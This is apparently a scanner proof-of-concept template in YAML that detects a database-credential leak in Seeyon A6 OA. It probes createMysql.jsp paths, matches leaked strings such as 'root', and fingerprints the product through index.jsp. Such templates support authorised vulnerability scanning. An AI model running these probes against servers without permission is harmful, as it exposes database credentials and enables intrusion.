name: poc-yaml-seeyon-a6-yyoa-createmysql-jsp-leak
binding: 279352b6-8bba-4437-8ea9-04b12c744c86
detail:
    author: chaitin
    links:
        - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20createMysql.jsp%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html
transport: http
rules:
    r0:
        request:
            method: GET
            path: /yyoa/createMysql.jsp
            follow_redirects: false
        expression: response.status == 200 && (response.body.bcontains(b"localhost") || response.body.bcontains(b"root") || response.body.bcontains(b"debugger"))
    r1:
        request:
            method: GET
            path: /yyoa/ext/createMysql.jsp
            follow_redirects: false
        expression: response.status == 200 && (response.body.bcontains(b"localhost") || response.body.bcontains(b"root") || response.body.bcontains(b"debugger"))
    r2:
        request:
            method: GET
            path: /yyoa/index.jsp
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"common/js/javaSeesion.js")
expression: r0() && r2() || r1() && r2()
